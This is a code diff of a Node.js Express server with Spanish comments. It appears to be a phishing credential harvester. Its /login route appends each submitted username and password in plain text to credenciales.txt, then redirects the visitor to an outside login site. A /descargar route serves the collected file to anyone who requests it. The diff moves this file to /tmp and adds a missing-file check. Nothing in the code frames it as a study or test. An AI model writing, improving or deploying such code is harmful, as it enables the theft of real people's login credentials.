@@ -21,12 +21,17 @@ app.get("/auth", (req, res) => {
 });
 
 // Ruta para descargar el archivo credenciales.txt
-app.get('/descargar', (req, res) => {
-  const filePath = path.join(__dirname, 'credenciales.txt');
-  res.download(filePath, 'credenciales.txt', (err) => {
+app.get("/descargar", (req, res) => {
+  const filePath = path.join("/tmp", "credenciales.txt");
+
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send("Archivo no encontrado.");
+  }
+
+  res.download(filePath, "credenciales.txt", (err) => {
     if (err) {
-      console.error('Error al descargar el archivo:', err);
-      res.status(500).send('Error al descargar el archivo');
+      console.error("Error al descargar el archivo:", err);
+      res.status(500).send("Error al descargar el archivo");
     }
   });
 });
@@ -37,10 +42,8 @@ app.post("/login", (req, res) => {
 
   // Guardar credenciales en archivo
   const credenciales = `Usuario: ${usuario} | Clave: ${clave}\n`;
-  fs.appendFileSync(
-    path.join(__dirname, "credenciales.txt"),
-    credenciales
-  );
+  const tempPath = path.join("/tmp", "credenciales.txt");
+  fs.appendFileSync(tempPath, credenciales);
 
   // Redirigir a otra web
   res.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
